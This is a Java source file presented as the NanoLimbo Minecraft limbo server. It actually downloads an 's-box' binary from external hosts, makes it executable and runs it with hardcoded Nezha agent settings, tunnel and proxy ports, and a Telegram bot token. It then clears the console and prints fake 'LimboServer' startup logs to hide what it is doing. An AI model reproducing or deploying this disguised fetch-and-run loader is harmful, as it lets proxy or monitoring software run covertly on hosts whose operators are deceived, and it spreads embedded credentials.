package ua.nanit.limbo;

import java.io.InputStream;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;

    private static final ScheduledExecutorService SCHED = Executors.newScheduledThreadPool(2);

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    public static void main(String[] args) {
        try {
            runSbxBinary();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
                SCHED.shutdownNow();
            }));

            System.out.println(ANSI_GREEN + "" + ANSI_RESET);

            // 20秒后清屏并伪装LimboServer日志
            SCHED.schedule(() -> {
                clearConsole();
                System.out.println(ANSI_GREEN + "" + ANSI_RESET);
                printFakeLimboLogs();
            }, 20, TimeUnit.SECONDS);

            // 保持程序运行，直到被 kill
            while (running.get()) {
                Thread.sleep(1000);
            }

        } catch (Exception e) {
            System.err.println(ANSI_RED + "" + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.inheritIO();  // 直接输出到控制台

        sbxProcess = pb.start();
    }

    private static void printFakeLimboLogs() {
        String[] logs = {
            "[INFO] [LimboServer] Starting LimboServer v1.0.0 (mock build)",
            "[INFO] [LimboServer] Loading configuration...",
            "[INFO] [LimboServer] Initializing server components...",
            "[INFO] [LimboServer] Preparing world 'world'",
            "[INFO] [LimboServer] Binding to port 25565...",
            "[INFO] [LimboServer] Done (5.123s)! For help, type \"help\"",
            "[INFO] [LimboServer] Server is running in offline mode.",
            "[INFO] [LimboServer] Installation completed successfully."
        };

        for (String log : logs) {
            System.out.println(log);
            try {
                Thread.sleep(1200); // 每条日志间隔 1.2 秒，更像真实启动
            } catch (InterruptedException ignored) {}
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {}
    }

    private static void loadEnvVars(Map<String, String> envVars) {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
        envVars.put("NEZHA_PORT", "443");
        envVars.put("NEZHA_KEY", "7XridnoTfSYvDsrTuU");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "7592034407");
        envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
        envVars.put("CFIP", "time.is");
        envVars.put("CFPORT", "2096");
        envVars.put("NAME", "Basic");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
    }

    private static Path getBinaryPath() throws Exception {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new Exception("Failed to set executable permission");
            }
        }
        return path;
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}